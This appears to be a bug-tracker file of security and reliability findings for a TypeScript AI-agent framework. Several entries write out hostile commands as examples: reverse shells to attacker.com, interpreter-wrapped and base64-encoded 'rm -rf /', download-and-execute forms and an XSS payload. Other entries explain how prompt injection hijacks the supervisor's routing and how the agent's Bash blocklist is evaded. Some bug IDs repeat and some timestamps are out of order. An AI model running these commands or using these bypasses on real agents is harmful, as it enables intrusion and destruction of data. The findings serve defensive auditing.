- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0287-proto-strip`
- **hunter_found:** `2026-03-21T04:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** `2026-03-20T08:11:25Z`
- **fix_summary:** `Added stripProtoKeys() applied unconditionally to toolCall.args before hook invocation and execute(). Zero-allocation fast-path when no polluting keys present. tsc clean.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/harness-tools-direct-args-proto-strip.test.ts`

---

### BUG-0288
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/supervisor.ts`
- **line:** `194`
- **category:** `security-injection`
- **description:** `routeViaLLM` embeds the raw `task` string and full `context` object into the LLM routing prompt without sanitization, enabling prompt injection that hijacks supervisor routing decisions.
- **context:** The routing prompt at line 194 is `TASK: ${task}` where `task = String(state[config.taskField] ?? "")` — an agent-supplied or user-supplied string injected verbatim. A crafted task value containing newlines with embedded instructions would override the routing instruction. The supervisor correctly sanitizes `agentDef.role` via `sanitizeRole()` (lines 114, 172), but applies no equivalent sanitization to `task` or `context` before embedding them in the routing prompt. An adversarial upstream agent output could redirect the entire swarm's routing to an arbitrary agent ID. Fix: apply the existing `sanitizeRole()` pattern (strip newlines, collapse whitespace, truncate) to `task` before embedding it in the prompt. OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0288`
- **hunter_found:** `2026-03-21T04:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** `2026-03-20T08:11:25Z`
- **fix_summary:** `Added sanitizeForPrompt() that collapses newlines, truncates to 2000 chars, wraps in triple-backtick fences. Applied to task and context in routeViaLLM. tsc clean.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/swarm/supervisor-prompt-injection-sanitize.test.ts`

---

### BUG-0289
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/hooks-engine.ts`
- **line:** `347`
- **category:** `security-auth`
- **test_generated:** `true`
- **test_file:** `src/__tests__/hooks-bash-bypass-extended.test.ts`
- **description:** The `withSecurityGuardrails()` Bash blocklist pattern `/curl[^|]*\|\s*sh/` is bypassed by redirecting output to a file then executing it, and does not cover `LD_PRELOAD` injection or `chmod +s` setuid escalation.
- **context:** The regex `/curl[^|]*\|\s*sh/` only blocks the direct pipe form `curl ... | sh`. Splitting into two commands (`curl url > /tmp/f && bash /tmp/f`) produces zero matches and passes all guards. Similarly `wget url -O /tmp/f && sh /tmp/f` bypasses the wget patterns. An LLM-generated Bash command using these split forms achieves identical remote code execution. Additionally, the blocklist has no pattern for `LD_PRELOAD=/tmp/evil.so command` (shared library injection) or `chmod u+s /bin/bash` (setuid escalation). Fix: add split-download-and-execute patterns (covering `> /tmp/` + shell invocation, `-O /tmp/` patterns), and add `LD_PRELOAD` and `chmod.*[+]s` entries to `dangerousBashPatterns`. OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0289`
- **hunter_found:** `2026-03-21T04:10:00Z`
- **fixer_started:** ``
- **fixer_completed:** `2026-03-20T08:11:25Z`
- **fix_summary:** `Added 5 patterns to dangerousBashPatterns: chmod +s, curl split download+execute (-o then sh), wget split, redirect-to-file then sh, LD_PRELOAD injection. tsc clean.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0292
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/compile-ext.ts`
- **line:** `36`
- **category:** `security-injection`
- **description:** `buildSwarmExtensions().toMermaid()` and `StateGraph.toMermaid()` embed node IDs directly into Mermaid markup without sanitization, enabling Mermaid injection via crafted agent or node names.
- **context:** A prior fix (BUG-0290/BUG-0291) added `sanitizeMermaid()` in `src/inspect.ts` and applied it to `toMermaidDetailed()`. However, two sibling `toMermaid()` implementations were not updated: (1) `src/swarm/compile-ext.ts` line 36 embeds `from` and `edge.to` verbatim — these are agent IDs sourced from `SwarmAgentDef.id`, which is supplied at `spawnAgent()` call time; (2) `src/graph.ts` line 223 does the same for `edge.from` / `edge.to`. A crafted ID such as `"a\nstyle a fill:#ff0000\ninjected_directive"` would inject arbitrary Mermaid directives into the diagram output. Since Mermaid diagrams are rendered in web UIs, this can enable client-side script injection (XSS) in environments that render the Mermaid output. Fix: import and apply `sanitizeMermaid()` from `inspect.ts` to all node name interpolations in both affected files. OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0292`
- **hunter_found:** `2026-03-20T08:20:00Z`
- **fixer_started:** `2026-03-20T09:06:39Z`
- **fixer_completed:** `2026-03-20T09:06:39Z`
- **fix_summary:** `Sanitized node IDs in toMermaid() to prevent Mermaid injection via crafted names.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/mermaid-node-injection.test.ts`

---

### BUG-0293
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/context-compactor.ts`
- **line:** `322`
- **category:** `test-regression`
- **description:** `fallbackTruncation()` returns 3 messages (header + truncated message) but test "falls back to truncation on model error" in `harness-compactor.test.ts` expects only 2 (the header pair).
- **context:** CI Sentinel detected regression on main. The prior fix for BUG about silent context loss changed `fallbackTruncation` to truncate oversized messages instead of dropping them — keeping a truncated copy in the result. The test was not updated to match the new 3-item return shape. The test expects `result.toHaveLength(2)` (header user + "Context loaded.") but now receives 3 items (header + truncated last message). The production code behavior is correct (truncating is better than silent context loss), but the test assertion must be updated to expect 3 items and verify the third item has truncated content.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0293-fix`
- **hunter_found:** `2026-03-20T02:35:00Z`
- **fixer_started:** `2026-03-20T09:40:21Z`
- **fixer_completed:** `2026-03-20T09:40:46Z`
- **fix_summary:** `Updated test to expect 3 messages instead of 2. Added assertions for truncated third item. All 14 tests pass, tsc clean.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0296
- **status:** `in-progress`
- **severity:** `high`
- **file:** `src/harness/hooks-engine.ts`
- **line:** `343`
- **category:** `security-injection`
- **description:** The `dangerousBashPatterns` blocklist is bypassed by base64-encoding a dangerous payload and piping the decoded output to a shell interpreter (e.g. `echo "cm0gLXJmIC8=" | base64 -d | bash`).
- **context:** The blocklist matches plaintext patterns like `curl|sh`, `mkfs`, `chmod 777`, etc. An attacker (via prompt injection) can encode any blocked command in base64, then decode and execute it — the encoded form matches none of the existing regex patterns. This is a universal bypass: `echo "<base64>" | base64 -d | sh` or `base64 -d <<< "<payload>" | bash` evades every pattern in the list. The fix should add patterns for `base64.*\|.*sh`, `base64.*\|.*bash`, and the heredoc variant. OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T20:00:15Z`
- **fixer_started:** `2026-03-20T22:00:00Z`
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0297
- **status:** `in-progress`
- **severity:** `high`
- **file:** `src/harness/hooks-engine.ts`
- **line:** `343`
- **category:** `security-injection`
- **description:** The `dangerousBashPatterns` blocklist can be bypassed by using scripting language interpreters (`python3 -c`, `perl -e`, `ruby -e`, `node -e`) to execute dangerous system commands that would otherwise be blocked.
- **context:** The blocklist only matches shell-native dangerous patterns (rm, mkfs, dd, curl|sh, etc.). A prompt-injected LLM payload such as `python3 -c "import os; os.system('rm -rf /')"` or `perl -e 'system("curl attacker.com|sh")'` executes arbitrary commands through an interpreter — the actual dangerous operation is inside a string literal invisible to the regex patterns. Since Python, Perl, Ruby, and Node are commonly available on developer machines, this is a practical bypass. Fix: add patterns for `python[23]?\s+-c`, `perl\s+-e`, `ruby\s+-e`, and `node\s+-e` with dangerous subcommands, or block interpreter `-c`/`-e` flags entirely when combined with system/exec calls. OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T20:00:15Z`
- **fixer_started:** `2026-03-20T22:00:00Z`
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0298
- **status:** `in-progress`
- **severity:** `high`
- **file:** `src/harness/hooks-engine.ts`
- **line:** `343`
- **category:** `security-injection`
- **description:** The `dangerousBashPatterns` blocklist has no patterns for reverse shell payloads (`bash -i >& /dev/tcp/host/port 0>&1`, `nc -e /bin/sh host port`) which allow an attacker to establish interactive remote access.
- **context:** A prompt-injected LLM could execute `bash -i >& /dev/tcp/attacker.com/4444 0>&1` or `nc -e /bin/sh attacker.com 4444` to open a reverse shell to an attacker-controlled server. Neither `/dev/tcp` redirection patterns nor netcat (`nc`) with `-e` flag are covered by any existing blocklist pattern. This is distinct from the download-and-execute patterns in BUG-0289 — reverse shells provide interactive access without downloading a payload. Fix: add patterns for `/dev/tcp/`, `nc\s+.*-e`, `ncat\s+.*-e`, and `socat.*exec` to the blocklist. OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T20:00:15Z`
- **fixer_started:** `2026-03-20T22:00:00Z`
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0304
- **status:** `pending`
- **severity:** `high`
- **file:** `src/checkpointers/redis.ts`
- **line:** `98`
- **category:** `race-condition`
- **description:** Non-atomic read-then-get in `get()`: `zrange` fetches all step members, then a separate `get` fetches the data key. Between these two round-trips a concurrent `put()` or `delete()` can invalidate the index entry, causing `get()` to silently return `null` for an existing thread.
- **context:** The two-round-trip pattern has no transaction or Lua script wrapping. A concurrent writer calling `put()` (which uses an atomic Lua script) between the `zrange` and `get` calls can add a higher step, making the step selected by `get()` stale. Similarly, a concurrent `delete()` can remove the data key after `zrange` returned its index entry. Fix: wrap `zrange` + `get` in a single Lua script or Redis MULTI/EXEC transaction.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0305
- **status:** `pending`
- **severity:** `high`
- **file:** `src/swarm/agent-node.ts`
- **line:** `119`
- **category:** `missing-error-handling`
- **description:** `onComplete` hook awaited without try/catch on both the handoff path (line 119) and normal return path (line 139). If `onComplete` throws, `registry.markIdle()` is never called, leaving the agent permanently in "busy" state.
- **context:** The `onStart` hook (lines 40-45) and `onError` hook (lines 185-189) in the same file are properly guarded with try/catch, but `onComplete` is not. A throwing `onComplete` hook permanently bricks the agent slot by skipping `markIdle()`. Fix: wrap both `onComplete` calls in try/catch, ensuring `markIdle()` always runs.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0306
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/swarm/pool.ts`
- **line:** `269`
- **category:** `missing-error-handling`
- **description:** `onError` hook awaited without try/catch. If `onError` itself throws, the hook exception replaces the original error (the `finally` block runs but the original `lastError` is lost), making diagnosis impossible.
- **context:** Known bugs cover `onStart` (line 196) and `onComplete` (line 209) hooks in the same file — this is the third lifecycle hook (`onError` at line 269) with the same missing guard. Fix: wrap in try/catch, log the hook error, and re-throw the original `lastError`.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0299
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/swarm/scaling.ts`
- **line:** `192`
- **category:** `logic-bug`
- **description:** `recentMaxLatencyMs` computation only processes `agent_complete` events, not `agent_error`. An agent that errors after a long run never has its start time popped from `recentStartTimes`, so its latency is excluded from the scale-up decision — slow-then-erroring agents never trigger latency-based scale-up.
- **context:** The `agent_error` branch is missing from the latency loop at lines 187-200. A slow agent that eventually errors will have its start timestamp orphaned in `recentStartTimes`, and the high latency will never be compared against `scaleUpLatencyMs`. Fix: add an `agent_error` branch that pops the start time and computes latency the same way `agent_complete` does.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0300
- **status:** `in-progress`
- **severity:** `critical`
- **file:** `src/pregel/streaming.ts`
- **line:** `295`
- **category:** `race-condition`
- **description:** Unsynchronized concurrent writes to shared subgraph runner state (`_subgraphRef.count`, `_perInvocationParentUpdates`, `_perInvocationCheckpointer`) when multiple parent nodes backed by the same subgraph execute in parallel via `Promise.allSettled`.
- **context:** Two parallel parent nodes sharing the same subgraph runner instance both increment `_subgraphRef.count` and write to the same Maps keyed by `namespacedThreadId` (derived as `parentThreadId:name`, not unique per invocation). One invocation's Map entries can be overwritten by the other, and the `finally` cleanup `delete` can evict entries for a still-running sibling, causing it to lose its parent updates or checkpointer reference. Fix: make `namespacedThreadId` include an invocation counter, or use a mutex around the subgraph setup block.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** `2026-03-20T22:00:00Z`
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0301
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/swarm/factories.ts`
- **line:** `78`
- **category:** `missing-error-handling`
- **description:** All three lifecycle hooks (`onStart` at line 78, `onComplete` at line 87, `onError` at line 90) in the fanout `runAgent()` are awaited without individual try/catch guards. If `onStart` throws, the catch block calls `onError` which is also unguarded — a double-throwing hook escapes `runAgent()` entirely and surfaces as an unhandled rejection to `Promise.all`.
- **context:** Unlike `agent-node.ts` which guards `onStart` and `onError`, the fanout runner in `factories.ts` has no hook isolation. A misbehaving hook causes the entire fanout to fail rather than just one agent slot. Fix: wrap each hook call in its own try/catch.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0302
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/swarm/mermaid.ts`
- **line:** `45`
- **category:** `security-xss`
- **description:** `toSwarmMermaid()` embeds agent `role` and capability `name` values directly into HTML tags (`<b>${entry.role}</b>`, `<i>${caps}</i>`) without escaping `<`, `>`, `&`, or `'` characters, enabling HTML injection in rendered Mermaid diagrams.
- **context:** Line 60 escapes `"`, `[`, and `]` but not HTML metacharacters. An agent definition with `role: "</b><img src=x onerror=alert(1)><b>"` injects arbitrary HTML into the Mermaid label. Since Mermaid diagrams are rendered in web UIs (VS Code previews, documentation sites, dashboards), this is a stored XSS vector — the malicious role persists in the agent registry and fires every time the diagram is displayed. Prior fixes (BUG-0290/0291/0292) addressed `sanitizeMermaid()` for node IDs in `inspect.ts` and `compile-ext.ts`, but `mermaid.ts` uses a different code path with inline HTML labels that was not covered. Fix: escape `<>&'"` in `entry.role` and `c.name` before embedding in HTML tags, or apply the existing `sanitizeMermaid()` pattern. OWASP A03:2021 - Injection / A07:2021 - XSS.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T20:04:36Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0303
- **status:** `pending`
- **severity:** `low`
- **file:** `src/lsp/index.ts`
- **line:** `134`
- **category:** `security-injection`
- **description:** `getErrorDiagnosticsText()` embeds `filePath` in an XML attribute (`<diagnostics file="${filePath}">`) without escaping, enabling XML attribute injection that can manipulate LLM context parsing.
- **context:** The `filePath` parameter is passed directly into the XML attribute at line 134. A file path containing `"` followed by additional XML attributes or closing tags (e.g. `path" malicious="true`) would break out of the attribute context. While this output is consumed as LLM context (not browser HTML), it could affect how the LLM interprets diagnostic boundaries — a crafted file path could inject fake diagnostic blocks or override the file attribute to misattribute errors. Additionally, `formatDiagnostic()` at line 244 embeds `d.message` and `d.source` from LSP server responses without escaping. Fix: apply XML escaping to `filePath`, `d.message`, and `d.source` using the existing `escXml()` function from `skill-loader.ts`. OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T20:04:36Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0307
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/mcp/transport.ts`
- **line:** `162`
- **category:** `memory-leak`
- **description:** `StdioTransport.stop()` calls `this.process.kill("SIGTERM")` without removing `"error"` and `"exit"` listeners first. The listeners close over `this` and `this.pending`, preventing GC of the transport instance until Node cleans up the process handle. In MCP server crash-restart loops this causes steady listener accumulation.
- **context:** Compare with `LSPClient.stop()` in `lsp/client.ts:208` which explicitly calls `removeAllListeners()` before killing. `StdioTransport` is missing this pattern. Fix: call `this.process.removeAllListeners()` before `this.process.kill()`.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0308
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/models/google.ts`
- **line:** `163`
- **category:** `api-contract-violation`
- **description:** `mapFinishReason` never returns `"stop_sequence"`. The Gemini API returns `finishReason: "STOP_SEQUENCE"` when the model stops at a user-supplied stop sequence, but this function maps it to `"end"`. The Anthropic adapter correctly handles this case.
- **context:** `ChatResponse.stopReason` declares `"end" | "tool_use" | "max_tokens" | "stop_sequence"`. Any caller differentiating `"stop_sequence"` from `"end"` (e.g. to detect partial output) will receive incorrect data from the Google adapter. Fix: add `if (reason === "STOP_SEQUENCE") return "stop_sequence"` before the fallback return.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0309
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/models/google.ts`
- **line:** `432`
- **category:** `api-contract-violation`
- **description:** Google adapter `stream()` emits `tool_call_start` directly followed by `tool_call_end` with no `tool_call_delta` events, and populates complete `args` in `tool_call_start`. The OpenAI/Anthropic adapters emit `tool_call_start` with `args: {}` followed by delta events — the Google adapter violates this staged delivery contract.
- **context:** Any stream consumer that accumulates args from `tool_call_delta` events will receive no deltas from Google and see empty args. Consumers that read `tool_call_start.args` will get complete data from Google but empty from OpenAI/Anthropic. Fix: emit `tool_call_start` with `args: {}`, then a single `tool_call_delta` with the complete args, then `tool_call_end`.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0304
- **status:** `pending`
- **severity:** `high`
- **file:** `src/guardrails/budget.ts`
- **line:** `57`
- **category:** `security-auth`
- **description:** `BudgetTracker.record()` performs no validation on `usage.inputTokens` or `usage.outputTokens`, allowing NaN or negative values to permanently disable all budget enforcement.
- **context:** If a model adapter returns `inputTokens: NaN` (e.g. from a malformed API response or parsing error), the cost calculation at line 67-69 produces `NaN`, and `this.totalCost += NaN` poisons the accumulator to `NaN` permanently. At line 138, `NaN > limit` evaluates to `false`, so the cost budget check never triggers again — the budget is silently bypassed for all subsequent calls. Similarly, negative token values (line 57-58) decrease the accumulator, effectively granting unlimited budget by "depositing" tokens. A compromised or buggy model adapter can exploit either path to bypass all cost and token limits. Fix: validate that `inputTokens` and `outputTokens` are finite non-negative numbers before accumulating, and treat NaN/negative as zero or throw. OWASP A01:2021 - Broken Access Control.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T20:08:29Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0305
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/swarm/agent-node.ts`
- **line:** `122`
- **category:** `security-auth`
- **description:** Handoff context merge at line 122 (`{ ...state.context, ...handoff.context }`) performs an unfiltered shallow merge, allowing a handing-off agent to overwrite privileged shared state fields such as `__deadlineAbsolute` or `lastAgentError`.
- **context:** When an agent executes a Handoff, `handoff.context` is spread directly into the shared `state.context` with no key filtering. An agent can craft a Handoff with `context: { __deadlineAbsolute: Infinity }` to disable deadline enforcement, or inject `lastAgentError: null` to clear error state and bypass supervisor error recovery. Since agent code can be influenced by prompt injection, this is an escalation vector: a prompt-injected agent can manipulate swarm-level control fields through the Handoff mechanism. Fix: filter handoff context keys against a denylist of privileged/internal fields (those starting with `__` or known supervisor control fields), or use an allowlist of user-defined context keys. OWASP A01:2021 - Broken Access Control.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T20:08:29Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0310
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/streaming.ts`
- **line:** `72`
- **category:** `logic-bug`
- **description:** `TokenStreamWriter.push()` has no guard against writes after `end()`. If `push(token)` is called after `end()` and the async iterator has already returned, the token is silently queued but never consumed — permanently dropped.
- **context:** Triggered when a streaming LLM call emits a final token concurrently with a node timeout calling `end()`. The `push` method does not check `this.done` before enqueuing. Fix: add `if (this.done) return` at the top of `push()`.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0311
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/hitl/resume.ts`
- **line:** `43`
- **category:** `logic-bug`
- **description:** `evict()` sets `s.status = "expired"` then immediately deletes the entry from the Map. A subsequent `get(resumeId)` returns `null`, making the expired status unreachable via the public API — callers cannot distinguish "expired" from "never existed".
- **context:** The comment on `get()` says sessions remain visible so callers can observe final status, but that only holds for `"resumed"` sessions. Fix: keep expired sessions in the Map for a grace period before final deletion.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0312
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/coordination/pubsub.ts`
- **line:** `34`
- **category:** `race-condition`
- **description:** `publish()` iterates `this.subscribers` Map with `for...of` while subscriber handlers can call `subscribe()` or unsubscribe during delivery. New subscriptions added mid-iteration may or may not be visited in the same `publish()` call, causing non-deterministic event delivery.
- **context:** Per ECMAScript spec, entries added to a Map during `for...of` iteration will be visited if not yet passed. Handlers that add new subscriptions during delivery can receive the event that triggered them. Fix: snapshot subscribers before iterating (`[...this.subscribers.entries()]`).
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0313
- **status:** `pending`
- **severity:** `high`
- **file:** `src/internal/validate-command.ts`
- **line:** `16`
- **category:** `security`
- **description:** `DANGEROUS_CHARS` regex omits newline (`\n`), carriage return (`\r`), and null byte (`\0`). A command string with embedded control characters passes validation; the security property relies on `which`/`existsSync` rejecting them implicitly rather than explicit input sanitization.
- **context:** The `which` call at line 33 happens to reject binaries with `\n` in the name, providing an implicit safety net. But any future code path using `trimmed` before the `which` check would be vulnerable. Additionally, spaces are not in `DANGEROUS_CHARS`, so command-with-args strings pass validation but fail at spawn time. Fix: add `\n\r\0` and space to `DANGEROUS_CHARS`.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:05:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

<!-- HUNTER: Append new bugs above this line -->

### BUG-0294
- **status:** `in-progress`
- **severity:** `medium`
- **file:** `src/graph.ts`
- **line:** `216`
- **category:** `security-injection`
- **description:** `StateGraph.toMermaid()` embeds raw node names into Mermaid markup via `lbl(n as string)` without sanitization, enabling Mermaid injection via crafted node names containing newlines and embedded directives.
- **context:** BUG-0292 fix applied `sanitizeMermaid()` to `src/swarm/compile-ext.ts` but missed `StateGraph.toMermaid()` in `src/graph.ts`. The `lbl()` helper at line 218-219 casts node names directly to string with no escaping. A crafted node name such as `"node\nstyle node fill:#ff0000\ninjected_directive"` or `'node\nclick node call alert("XSS")'` injects arbitrary Mermaid directives into the output. Since Mermaid diagrams are rendered in web UIs, this can enable XSS in environments that render the diagram. Two regression tests in `src/__tests__/mermaid-node-injection.test.ts` confirm this: "BUG-0292: crafted node ID containing newline should not inject Mermaid directives" and "BUG-0292: crafted node ID containing Mermaid click directive should be escaped" both fail. Fix: import `sanitizeMermaid` from `./inspect.js` and apply it in `lbl()` for non-START/non-END nodes. OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T05:23:00Z`
- **fixer_started:** `2026-03-20T12:26:49Z`
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0295
- **status:** `pending`
- **severity:** `low`
- **file:** `src/errors.ts`
- **line:** `58`
- **category:** `information-disclosure`
- **description:** `ONIError.toJSON()` and `toInternalJSON()` are identical — both expose `stack` in their output. The method names imply different audiences (external vs internal), but the external-facing `toJSON()` leaks call stack traces, revealing internal file paths and library versions to callers. Any code that serializes an `ONIError` to a client or log sink via `JSON.stringify()` or similar will inadvertently expose stack information. Fix: remove the `stack` field from `toJSON()` so only `toInternalJSON()` includes it. OWASP A05:2021 - Security Misconfiguration.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T13:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---
